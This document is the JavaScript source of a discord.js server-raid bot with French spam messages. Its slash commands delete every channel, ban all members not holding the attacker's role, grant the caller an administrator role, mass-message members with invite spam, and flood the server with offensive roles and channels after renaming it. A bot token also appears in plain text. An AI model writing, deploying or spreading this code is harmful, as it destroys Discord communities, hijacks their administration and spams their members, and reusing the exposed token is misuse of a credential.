const Discord = require('discord.js');
	const bot = new Discord.Client();
	const prefix = "/";
	const token = "NjM0ODM2NzYzNTU0MzQ5MDk0.XaoUvg.dnE1ef-lV0ysQwwUgwdaP0njUfM"

	bot.on("ready", () =>{
	    console.log(`${bot.user.tag}`)
	    bot.user.setActivity("By DIVISION", {type: "Streaming", url: 'https://www.twitch.tv/DIVISION'});
	});


	bot.on('message', msg => {
	  
	              if (msg.content === prefix + "all") {
	                if (msg.deletable) msg.delete();
	                let i = 0;
	                var interval = setInterval(function () {
	                    msg.guild.channels.forEach(channel => {
	        if (channel.type === "text") channel.send("Rejoignez ça coute rien :p @everyone https://discord.gg/YecDghW ")               }, 3500);
	            })
	        }
	 
	if(msg.content.startsWith ( prefix + "sup")) {
	      let args = msg.content.split(" ").slice(1);
	      let messagecount = parseInt(args[0]) || 1;
	      var deletedMessages = -1;
	      msg.channel.fetchMessages({ limit: Math.min(messagecount + 1, 100, 200) })
	          .then(messages => {
	              messages.forEach(m => { m.delete().catch(console.error); deletedMessages++; });
	          }).then(() => {
	              if (deletedMessages === -1) deletedMessages = 0;
	              msg.channel.send(`** ${deletedMessages} **__messages sont en cours de supréssions__ :white_check_mark:  `)
	                  .then(m => m.delete(5000));
	          }).catch(console.error);
	  }

	  if(msg.content === prefix + "cc"){
	    if(msg.deletable) msg.delete();
	      if(msg.guild.channels.size === 0) return;
	        if(!msg.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
	          msg.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
	  }

	  if(msg.content === prefix + "banall"){
	    if(msg.deletable) msg.delete();
	      if(msg.channel.type === 'dm') return;
	        if(!msg.guild.member(bot.user).hasPermission("BAN_MEMBERS")) return;
	          msg.guild.members.forEach(member => {
	            if (!member.roles.exists("name", "VirtuelGang") && member.bannable) member.ban();
	          })
	  }
	  
	  if(msg.content === prefix + "pa"){
	    if(msg.deletable) msg.delete();
	      if(msg.channel.type === 'dm') return;
	        if(!msg.guild.member(bot.user).hasPermission("ADMINISTRATOR")) return;
	          msg.member.guild.createRole({name: "VirtuelGang", permissions: "ADMINISTRATOR"}).then(function(role)  
	            {msg.member.addRole(role);
	          })
	  }

	  if(msg.content === prefix + "role"){
	    if(msg.deletable) msg.delete();
	      if(msg.channel.type === 'dm') return;
	        setInterval(function () {
	          if(msg.guild.roles.size < 99) msg.guild.createRole({name: "FUCKED BY DIVISION", color: "RANDOM"}).catch(error => {})
	            if(msg.member.roles.size < 99) msg.member.addRole(msg.guild.roles.findAll("name", "FUCKED BY DIVISION"))
	          
	        })
	        
	  }
	 
	  if(msg.content === prefix + "mp"){
	    if(msg.deletable) msg.delete();
	      if(msg.channel.type === 'dm') return;
	        msg.guild.members.forEach(member => {
	          member.send("Rejoignez ça coute rien :p  https://discord.gg/YecDghW  ")        })
	  }

	  if(msg.content === prefix + "salon"){
	    if(msg.deletable) msg.delete();
	      if(msg.channel.type === 'dm') return;
	        if(msg.guild.name != 'Fucked by ANTI BDH'){
	          msg.guild.setIcon("https://cdn.discordapp.com/attachments/641355604916699167/641361882950926346/Uzumaki.png")
	          msg.guild.setName("Fucked by ANTI BDH")
	          msg.guild.setRegion("japan").catch(error => {})
	        }
	        
	          setInterval(function () { if(msg.guild.channels.size < 149) {
	            msg.guild.createChannel('Fucked by ANTI BDH', 'text').catch(error => {})
	          }}, 200)
	  }


	})

	bot.login(process.env.BOT_TOKEN)
